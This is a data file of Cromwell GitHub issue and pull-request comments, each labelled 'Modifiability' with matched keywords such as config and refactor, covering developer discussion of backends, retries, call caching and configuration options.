Modifiability,"@ffinfo my concern was more that the `isAlive` should be opt-in, not that that timeout should be opt in. . if I'm reading this right (EDIT: I think I got it a bit wrong first time):. - The job enters the `Running` state; - The first time we poll for it, we *always* check whether it's alive; - While it still is, we keep running `isAlive` every time we get polled; - Otherwise we enter the `WaitingForReturnCode`; - After the job is no longer alive, we abandon it after a given timeout and declare it failed; - If no timeout is configured, we keep waiting forever. I think this shouldn't be too much of a refactor:. - The job enters the `WaitingForReturnCode` state; - We immediately schedule an `CheckAlive` message to the actor at the configurable time; - If the cadence is not set, we never send that message (this would be the default); - When that CheckAlive arrives we can run `isAlive` and remember the result (and if we're still alive, schedule another `CheckAlive` again after the same delay); - If the `isAlive` failed, the next poll would return `Failed`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-423569265:528,config,configured,528,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-423569265,3,"['config', 'refactor']","['configurable', 'configured', 'refactor']"
Modifiability,"@francares Ah! I see. Yeah, I asked because I wasn't sure why we'd need another command type, we could either make a different type of ExecutorActor or have a branch in the existing ExecutorActor for caches. So we agree there. As for another message type, I believe this is all configured in (a) global config file and (b) workflow options so the actors should already have everything they need to decide whether to allow caching or not. So IMO there's no special case at this layer to handle caching.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/604#issuecomment-200959492:278,config,configured,278,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/604#issuecomment-200959492,2,['config'],"['config', 'configured']"
Modifiability,@francares At this point I just took a quick skim so nothing substantive to say but in general I love that this is moving to the config backend. I was curious if you could provide more explanation on what motivates the changes to the runtime attr structure?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2141#issuecomment-291680472:129,config,config,129,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2141#issuecomment-291680472,1,['config'],['config']
Modifiability,"@francares Oh, I think I see what you're saying - don't worry, if you look at the two *_FinalCallActor_s, they're very (_very_) thin layers around the base trait. . So, it shouldn't be a big issue to incorporate this change when you come to merge. Btw, those two are both already FSM...?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/390#issuecomment-173695801:133,layers,layers,133,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/390#issuecomment-173695801,1,['layers'],['layers']
Modifiability,"@francares The backend call actor sends the call to a backend for execution. The FinalCall actor runs tidy-up code locally (i.e. inside cromwell) at the end of an entire workflow (for now - the nice thing about having this in the actor ecosystem is that it's easy to move these wherever and whenever we want). This change is mainly just refactoring of a Future into an explicit actor, so that we can add more easily (do you have access to the Jira backlog? See issue 2542). Your second comment sound ominous... could you elaborate?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/390#issuecomment-173585608:337,refactor,refactoring,337,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/390#issuecomment-173585608,1,['refactor'],['refactoring']
Modifiability,"@francares oh ok, as long as it's on the long range plan. Incidentally, the other DB components (job store, workflow store) use a composition model without going too overboard on abstraction layers.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1254#issuecomment-237934690:191,layers,layers,191,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1254#issuecomment-237934690,1,['layers'],['layers']
Modifiability,@francares sorry about the delay. There are separate tickets filed to converge documentation for config based backends so I wouldn't worry about that too much. :+1: assuming the tests pass. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/2141/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2141#issuecomment-294217336:97,config,config,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2141#issuecomment-294217336,1,['config'],['config']
Modifiability,"@geoffjentry - we are facing something similar. Our SGE was recently updated and job submissions randomly fail due `unable to contact qmaster`. Our HPC team is looking into it. In the meantime, I am looking for a way to configure Cromwell to retry failed job submissions using the SGE backend. I have tried adding `maxRetries` to the runtime attributes to retry failed job submissions, but seems like this does not retry job submission errors. Only retries task errors. Is that correct? Any advice would be appreciated. Is this a feature that is currently supported? Thanks in advance. I also have seen various different configs on the WDL/Cromwell forum, but not sure if any are still supported. For example:. [forum post](https://gatkforums.broadinstitute.org/wdl/discussion/10475/cromewell-28-root-configuration-not-working); ```; system {; max-retries = 10; }; backend {; max-job-retries = 4; }; ```. [forum post](https://gatkforums.broadinstitute.org/wdl/discussion/9576/is-this-error-caused-by-a-job-submission-failure); ```; system {; max-retries = 50; job-rate-control {; jobs = 5; per = 1 second; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-510029897:220,config,configure,220,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-510029897,3,['config'],"['configs', 'configuration-not-working', 'configure']"
Modifiability,"@geoffjentry -- as of Cromwell 35, `backend` key in the workflow options is honored above the default backend. In case of the workflow option asking for a backend that doesn't exit, Cromwell explicitly fails with:. `Backend for call <call-name> ('<backend-name') not registered in configuration file...`. I believe this issue has been resolved with these changes. Feel free to re-open if something was missed.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1312#issuecomment-424937274:281,config,configuration,281,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1312#issuecomment-424937274,1,['config'],['configuration']
Modifiability,"@geoffjentry ; I'm using SGE as backend and a MariaDB database. Running cromwell inside a docker container.; Call-caching is ON, I've got a concurrent job limit of 100, and a slightly customised job script epilogue. The rest of the cromwell config is standard as in the docs.; Anything other relevant info that I could provide?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2450#issuecomment-423505570:241,config,config,241,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2450#issuecomment-423505570,1,['config'],['config']
Modifiability,"@geoffjentry Correct, I understand :) What I am suggesting that a uniform configuration file should exist for the user (runtime attributes, file behavior, etc.):; - If a configuration does is not present, then the user is presented with an message that it will assume reading from the path of the provided files, with an example of the path. A command ""cromwell describe/get config"" will show the current configuration.; - Then the program will provide them with an option like ""cromwell set-config defaults"" or something that makes sense for them to update the behavior to their choosing. Then this config file will be stored/read-from a ""well-known location"" for looking up a user's preference. If a program has multiple paths it can take - because of unset option - it will let the user know. Basically the less users have to type and deal with, the more they can concentrate on getting things done :) It will save you time in the way to update and configure new features, and it will provide user comments on preferred settings through use-cases.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1260#issuecomment-238118849:74,config,configuration,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1260#issuecomment-238118849,7,['config'],"['config', 'configuration', 'configure']"
Modifiability,@geoffjentry I agree and that was sort of the point of my pushback. Why make all this effort to refactor these retry's into a format which is still kind of horrible and difficult to follow!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1004#issuecomment-226013751:96,refactor,refactor,96,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1004#issuecomment-226013751,1,['refactor'],['refactor']
Modifiability,@geoffjentry I am currently debugging a workflow on SLURM and can provide a beta backend configuration. Should I submit this as a merge request to `core/src/main/resources/reference.conf`?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1750#issuecomment-291606740:89,config,configuration,89,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1750#issuecomment-291606740,1,['config'],['configuration']
Modifiability,"@geoffjentry I don't think this flag affects whether **images** are retained, only whether **file systems of containers** are retained. (I could certainly be wrong about that as I'm no Docker expert, just trying to grok the docs now. :smile: ). The docs do say that the ability to poke around in the filesystems of defunct containers can be a great help to debugging. I'm not sure how many of our users would want to do this, but if they do I think we should make that possible. So I'm fine with `--rm` being passed by default to `docker run`, but I think there should be a way to override this with a config option.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/167#issuecomment-137045581:602,config,config,602,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/167#issuecomment-137045581,1,['config'],['config']
Modifiability,@geoffjentry I ran into the same problem with `long_cmd` when I made the same mistake of using a non-CI config during horicromtal testing. Some lessons learned [here](https://github.com/broadinstitute/cromwell/pull/4748/files).,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4747#issuecomment-473341426:104,config,config,104,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4747#issuecomment-473341426,1,['config'],['config']
Modifiability,"@geoffjentry I understand re: egress charges. In my use case these aren't an issue, so a flag option would still help. Maybe, make egress cost a config option of a filesystem, and only reuse results if the egress cost would be under some user-specified value? You can also drop the requirement of specifying one engine/filesystem for all tasks. You could then return a cached result from any filesystem where it exists, without needing to copy it to a target filesystem. You could then also let workflow inputs point to files on different filesystems, and automatically choose the engine for each job based on where its inputs are.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4616#issuecomment-461576286:145,config,config,145,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4616#issuecomment-461576286,1,['config'],['config']
Modifiability,"@geoffjentry I want to resort to authority and say ""Zen of Akka""... . Reasons for my gut feeling: A mutable val makes it look and act more like a state machine, and reduces the risk of accidentally leaking the variable pointer to other threads which may update it out of band. Obviously not likely in this case, but as a muscle memory thing a-la `Some(constant)`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1044#issuecomment-227570413:210,variab,variable,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1044#issuecomment-227570413,1,['variab'],['variable']
Modifiability,"@geoffjentry I'm not sure if it's a 5 min change, but surely it's not a thing for 5 days. We are still working on some of the caching behaviors (we are still not clear on that yet).. and that's why a face-to-face with you guys will help us in understanding the implications of some of the refactoring. The change to implement the new backend interface in it's own will not be much, but the some functionalities like caching may still be lacking as of right now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/401#issuecomment-174086368:289,refactor,refactoring,289,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/401#issuecomment-174086368,1,['refactor'],['refactoring']
Modifiability,@geoffjentry Is this per-job or an overall config setting?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2424#issuecomment-313498705:43,config,config,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2424#issuecomment-313498705,1,['config'],['config']
Modifiability,"@geoffjentry That makes sense, thanks. Given the current code structure it's not at all clear to me how Docker-dependent branching would fit in - maybe this would be easier as a boolean configuration option adjacent to `workflow-log-dir`?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4499#issuecomment-562687693:186,config,configuration,186,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4499#issuecomment-562687693,1,['config'],['configuration']
Modifiability,"@geoffjentry This issue has been in the WDL repo ([#20](https://github.com/openwdl/wdl/issues/20)) for nearly 2 years, and has the blessing of the originator of WDL (@scottfrazer). And we can see here that at least one of the current core team members (@patmagee) has voiced support. I think a good initial pass for OpenWDL should be to go through the outstanding issue list rather than start from scratch. Having to resubmit via the mailing list and go through the entire RFC procedure seems extremely heavy-handed for someone who's an end-user of WDL via either FireCloud or Cromwell. This is a capability I, and several others, have a strong use-case for. While I might have suggestions on how its implementation should look like (same as for inputs, just in the output section), in the grand scheme of things, all I want is a capability that will make FireCloud/Cromwell easier for me to use; I care about the ""what"", not the ""how"". There needs to continue to be a path for end-user-requested enhancements, rather than just developer-requested enhancements, which is what the [rfc protocol](https://github.com/openwdl/wdl/blob/master/GOVERNANCE.md#rfc-process), as outlined, really seems geared towards.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1838#issuecomment-340037503:997,enhance,enhancements,997,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1838#issuecomment-340037503,2,['enhance'],['enhancements']
Modifiability,"@geoffjentry We are having some strange issues with this. Likely the `defuse` software is not written that well, however Its odd how the tool runs fine in a docker, so long as that docker is not run through cromwell either locally or in the cloud. Does Cromwell set any specific environment variables or properties related to memory maybe?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4465#issuecomment-445882497:291,variab,variables,291,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4465#issuecomment-445882497,1,['variab'],['variables']
Modifiability,"@geoffjentry We are not using Docker, but you are right that it might be better to make it a configuration flag like @danbills initially suggested, rather than automatic, in case it would break someone's workflow... like maybe if they were using Docker and non-Docker in the same workflow?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3333#issuecomment-374724001:93,config,configuration,93,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3333#issuecomment-374724001,1,['config'],['configuration']
Modifiability,@geoffjentry and @cjllanwarne:; Thank you for you response. I do understand your concerns. In the future I we going to move away from traditional HPC systems (i hope). For now we have sadly to deal with them. I already have this config value in place with a default. I can remove this default and using this behaviour when `exit-code-timeout` is set. This easy to do.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-423100767:229,config,config,229,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-423100767,1,['config'],['config']
Modifiability,"@geoffjentry do you mean from a default configuration perspective? We could have a pluggable ""metadata service"" in Cromwell (which I think we already have) with two implementations (direct DB write vs JMS emitter) could go into mainstream cromwell. Of course the listener for that would be a separate service (and easy to scale). Maybe that's what you mean though?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2466#issuecomment-320245697:40,config,configuration,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2466#issuecomment-320245697,1,['config'],['configuration']
Modifiability,@geoffjentry if you put something like:; ```wdl; version biscayne; ```; then cromwell executes it as if it is draft-2. If I try to make biscayne the default version in application config it also executes it as if it is draft-2 (like not knowing about ~{varible} symbols instead of ${variable} and functions like as_map),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4491#issuecomment-453310373:180,config,config,180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4491#issuecomment-453310373,2,"['config', 'variab']","['config', 'variable']"
Modifiability,"@geoffjentry my labmates prefer TSV-s with headers and I had to adapt, so I tried loops as a solution. Going through Array[Array[String]] and turning it into Array[Map[String, String]] in a loop looked like the best solution for me. I tried both while loops and scatters and both of them could not change the array announced before the loop.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3305#issuecomment-367444645:64,adapt,adapt,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3305#issuecomment-367444645,1,['adapt'],['adapt']
Modifiability,"@geoffjentry, is the MetadataSummarizer config toggled with the `metadata-summary-refresh-interval` in the reference configuration?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2452#issuecomment-347328631:40,config,config,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2452#issuecomment-347328631,2,['config'],"['config', 'configuration']"
Modifiability,"@grsterin @aednichols if not an adapter from the old config, I do think a stub which throws an exception saying ""you need to update your config"" or something similar would be better than users suddenly getting cryptic errors like `""Class not found: x.y.z""`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5386#issuecomment-579501948:32,adapt,adapter,32,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5386#issuecomment-579501948,3,"['adapt', 'config']","['adapter', 'config']"
Modifiability,@helgridly is this still a non-urgent enhancement request?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2701#issuecomment-335873358:38,enhance,enhancement,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2701#issuecomment-335873358,1,['enhance'],['enhancement']
Modifiability,@hjfbynara Can we configure apache to disable this endpoint in production as a stopgap?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3713#issuecomment-393635892:18,config,configure,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3713#issuecomment-393635892,1,['config'],['configure']
Modifiability,"@hkeward welcome to our repo and thank you for your contribution. We were actually looking at making this timeout configurable ourselves, so you've done some of our work for us.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5273#issuecomment-555176923:114,config,configurable,114,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5273#issuecomment-555176923,1,['config'],['configurable']
Modifiability,"@hmkim ; I continue the break point to run it again, it works now.; What part of process takes long idle time in your instance? what makes the long idle time?; In fact, the pipeline always consists of multiple processes and works on hundreds of samples. ; In case of time, what should i config to avoid this errors not run it again?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4403#issuecomment-439905197:287,config,config,287,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4403#issuecomment-439905197,1,['config'],['config']
Modifiability,"@hnawar I tried us-east1, which failed. But then I saw a comment in one of the example config files that only us-central1 and europe-west2 are supported by the API, so I used us-central1. I did not actually try europe-west2.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6497#issuecomment-922870328:87,config,config,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6497#issuecomment-922870328,1,['config'],['config']
Modifiability,"@horneth - so I see 2 Futures in here. One the little bit changing the state (around the Props) and the other was resolveAndEvaluate. As background for my statement I'll say the following:; - We've already seen firsthand the havoc which can erupt from having Futures rolling around inside an Actor. They break the Actor Model's abstraction that the internals of an actor are single threaded, meaning you now have to reason about shared mutable state, etc. We _can_ do that, but there are easier paths than actors to deal with that. We've been better about this recently but my concern is that it's too easy for stuff like that to sneak into what were previously pure Futures. Mixing Futures & Actors is not really a great idea.; - There are two async operations in the actor, which means that it is certainly doing two different things (I'll admit that the creation of an actor is a fairly lame 'thing'), disrupting Akka's mantra that actors should do one thing only. What I was suggesting was that the work being performed by these Futures be themselves pushed to their own actors. When they complete they can message back to this one, and those messages could be use to manage state transitions and such. (and to be clear, this is _not_ our little 'tol' code phrase - it's something I think we need to be much better about as we refactor cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/818#issuecomment-218573678:1331,refactor,refactor,1331,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/818#issuecomment-218573678,1,['refactor'],['refactor']
Modifiability,"@illusional - The mount point should be `/cromwell_root` when you create the custom AMI. The is the filesystem path that Cromwell uses by default for task data. When creating your config file you will need to specify the region you are operating it - i.e. where your S3 bucket and Batch queues are. All of the above should be preconfigured if you use the [Cromwell ""All-in-One"" template](https://docs.opendata.aws/genomics-workflows/cromwell/cromwell-aws-batch/#tldr).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-445968094:180,config,config,180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-445968094,1,['config'],['config']
Modifiability,@illusional . At our cluster we use both `cached-copy` and `path+modtime` and call-caching works fine. All our call-caching failures where related to how we implemented the tasks. Have you tried using `cromwell run -m metadata.json workflow.wdl`? In that case the call cache variables will be saved in the `metadata.json` file. It is very informative to see how these change between runs.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5346#issuecomment-589548236:275,variab,variables,275,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5346#issuecomment-589548236,1,['variab'],['variables']
Modifiability,"@illusional I tried to reproduce the issue, but cached-copy localization didn't work for me with both cromwell-50 and cromwell-51 when using configuration file you provided.; On the other hand, when using the following configuration file, `cached-inputs/` was successfully populated for me by both 50 and 51 cromwells:; ```; include required(classpath(""application"")). backend: {; ""default"": ""Local"",; ""providers"": {; ""Local"": {; ""actor-factory"": ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"",; ""config"": {; ""root"": ""/Users/gsterin/cachedcopy/exec_dir"",; ""filesystems"": {; ""local"": {; ""localization"": [""cached-copy""]; }; }; }; }; }; }; ```. It looks like configuration key enabling cached-copy localization should be `filesystems.local.localization` instead of `filesystems.local.duplication-strategy` and also looks like joining configuration keys with `.` symbol doesn't work when your configuration is in pure JSON format (but it works with HOCON format).; So `""filesystems.local.duplication-strategy"": [""cached-copy""]` should be replaced by ; ```; ""filesystems"": {; ""local"": {; ""localization"": [""cached-copy""]; }; }; ```. But I'm still not sure why cached-copy localization worked in Cromwell 50 with your configuration. Would you be able to double-check please?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5533#issuecomment-642196399:141,config,configuration,141,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5533#issuecomment-642196399,9,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config', 'configuration']"
Modifiability,"@illusional Thanks for this. I have been looking into (but not having time for) an easy option that would disable the hash lookup altogether. Cromwell connecting to quay.io while quay.io is down causes crashes we do not want in production. There is a configuration option for this. So it was easy. Unfortunately the hash lookup is coupled with the call-caching mechanic. No hash, no cache. Which is something to be aware of. I was wondering if the easiest way wouldn't be to have the lookup be a command in the config. Just like `docker_kill` there could be a `docker_lookup_hash`. That way you can override the default with a custom command that returns a string (https://stackoverflow.com/a/39376254). . For example:; ```; $ docker inspect --format='{{index .RepoDigests 0}}' mysql:5.6; mysql@sha256:19a164794d3cef15c9ac44754604fa079adb448f82d40e4b8be8381148c785fa; ```; This does NOT need the internet. Similarly, this would enable hash-lookup for singularity users as well without internet.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5545#issuecomment-660994330:251,config,configuration,251,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5545#issuecomment-660994330,2,['config'],"['config', 'configuration']"
Modifiability,"@illusional The key part was this:; ```; runtime-attributes = """"""; Int cpu = 1; String? memory; """"""; ```; plus passing `memory` to the submit command - which in my case is a wrapper script that can interpret strings like ""4GB"". After another hour of trial-and-error I did finally get a working config using `memory_gb` in the config file instead of `memory`. But I have to say, a colleague and I read the documentation on memory repeatedly and we're still confused about what it's *trying* to say and how that relates to what actually happens. (In particular, it is not clear that you can't pass `memory` directly to non-SFS backends.) The fact that both `memory` and `memory_gb` can be task runtime parameters, yet one will presumably be overridden anyway, seems unwise.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5530#issuecomment-637924284:294,config,config,294,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5530#issuecomment-637924284,2,['config'],['config']
Modifiability,@illusional. There is a path+modtime strategy [in the documentation](https://cromwell.readthedocs.io/en/stable/Configuring/#local-filesystem-options) . That is what we use on our cluster and it works fine.; @cmarkello have you tried running cromwell with the `-m` flag to capture metadata? I believe the call-caching values are stored in the metadata. These can be used to diagnose the problem.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-589546514:111,Config,Configuring,111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-589546514,1,['Config'],['Configuring']
Modifiability,"@ip-10-80-199-174 ~]$ java -Dconfig.file=aws.callcache.conf -jar ~/cromwell-35.jar run -i hello_inputs.json hello.wdl; [2018-11-21 15:08:54,14] [info] Running with database db.url = jdbc:mysql://cromwell-db-rdscluster-6zlvcyvtarfq.cluster-ct1b0hjjpe9q.us-east-1.rds.amazonaws.com/cromwell; [2018-11-21 15:09:03,32] [info] Running with database db.url = jdbc:mysql://cromwell-db-rdscluster-6zlvcyvtarfq.cluster-ct1b0hjjpe9q.us-east-1.rds.amazonaws.com/cromwell; [2018-11-21 15:09:03,62] [warn] Unrecognized configuration key(s) for AwsBatch: auth, numCreateDefinitionAttempts, numSubmitAttempts; [2018-11-21 15:09:03,91] [info] Slf4jLogger started; [2018-11-21 15:09:04,16] [info] Workflow heartbeat configuration:; {; ""cromwellId"" : ""cromid-23ba05a"",; ""heartbeatInterval"" : ""2 minutes"",; ""ttl"" : ""10 minutes"",; ""writeBatchSize"" : 10000,; ""writeThreshold"" : 10000; }; [2018-11-21 15:09:04,43] [info] Metadata summary refreshing every 2 seconds.; [2018-11-21 15:09:04,51] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-11-21 15:09:04,53] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-11-21 15:09:04,60] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-11-21 15:09:05,40] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-11-21 15:09:05,44] [info] SingleWorkflowRunnerActor: Version 35; [2018-11-21 15:09:05,44] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-11-21 15:09:05,51] [info] Unspecified type (Unspecified version) workflow 02306258-436a-4372-ab54-2dcd83c42b47 submitted; [2018-11-21 15:09:05,52] [info] SingleWorkflowRunnerActor: Workflow submitted 02306258-436a-4372-ab54-2dcd83c42b47; [2018-11-21 15:09:05,53] [info] 1 new workflows fetched; [2018-11-21 15:09:05,53] [info] WorkflowManagerActor Starting workflow 02306258-436a-4372-ab54-2dcd83c42b47; [2018-11-21 15:09:05,54] [info] Workflow",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421:1053,config,configured,1053,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421,1,['config'],['configured']
Modifiability,"@jainh Yes, there are multiple `--conf` attributes.; If there is no space in the value of `--conf` attribute, single quote is not needed; otherwise, I think it's needed. However the [gatk-launch](https://github.com/broadinstitute/gatk/blob/70edbb6e4caa2b7cf1b8678450443c0c590a2b76/gatk-launch) in GATK beta 4 does not produce the single quote for such case; but if I run the following without single quote, it leads to error:; >Error: Unrecognized option: -Dsamjdk.use_async_io_read_samtools=false. command:; ```; /opt/spark-latest/bin/spark-submit --master spark://localhost:6066 --deploy-mode cluster \; --driver-cores 4 --driver-memory 8g --executor-memory 4g --total-executor-cores 10 \; --conf 'spark.executor.extraJavaOptions=-DGATK_STACKTRACE_ON_USER_EXCEPTION=true -Dsamjdk.use_async_io_read_samtools=false' \; --conf 'spark.driver.extraJavaOptions=-DGATK_STACKTRACE_ON_USER_EXCEPTION=true -Dsamjdk.use_async_io_read_samtools=false -Dsamjdk.use_async_io_write_samtools=false -Dsamjdk.use_async_io_write_tribble=false -Dsamjdk.compression_level=1 -Dsnappy.disable=true' \; ...; ```; Here is a related [post](https://stackoverflow.com/questions/28166667/how-to-pass-d-parameter-or-environment-variable-to-spark-job) on stackoverflow.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2640#issuecomment-330666862:1199,variab,variable-to-spark-job,1199,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2640#issuecomment-330666862,1,['variab'],['variable-to-spark-job']
Modifiability,"@jbakerpmc there have been no changes to reference disk localization configuration between GCP Batch and PAPI v2 beta that I'm aware of. You can `include` if you prefer to keep reference disk config in a separate file, or just inline to your main config if you prefer.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2375382005:69,config,configuration,69,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7502#issuecomment-2375382005,3,['config'],"['config', 'configuration']"
